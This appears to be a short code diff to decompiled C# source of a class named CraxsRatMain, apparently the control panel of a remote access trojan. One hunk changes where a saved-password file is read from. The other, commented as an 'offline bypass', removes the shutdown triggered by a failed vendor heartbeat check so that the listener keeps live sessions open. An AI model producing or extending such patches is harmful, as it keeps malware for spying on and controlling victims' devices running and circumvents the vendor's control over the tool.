@@ -307,7 +307,7 @@ public class CraxsRatMain : Form
 								_0024VB_0024Me.checksavepass.Checked = MySettingsProperty.Settings.savepass;
 								if (_0024VB_0024Me.checksavepass.Checked)
 								{
-									_0024VB_0024ResumableLocal_filepath_002425 = Environment.CurrentDirectory.ToString() + "\\res\\Config\\Pass.inf";
+									_0024VB_0024ResumableLocal_filepath_002425 = reso.res_Path + "\\Config\\Pass.inf";
 									_0024VB_0024ResumableLocal_list_002426 = File.ReadAllLines(_0024VB_0024ResumableLocal_filepath_002425);
 									_0024S27 = _0024VB_0024ResumableLocal_list_002426;
 									for (_0024S28 = 0; _0024S28 < _0024S27.Length; _0024S28++)
@@ -11095,9 +11095,13 @@ public class CraxsRatMain : Form
 			{
 				xt_err++;
 			}
+			// Offline bypass: the vendor heartbeat API is dead, so Apihear always
+			// fails and this used to Environment.Exit(0) after 6 minutes, killing
+			// live listener sockets mid-session. Stay up and only reset the
+			// counter when the API actually answers again.
 			if (xt_err > 5)
 			{
-				Environment.Exit(0);
+				xt_err = 0;
 			}
 		}
 	}
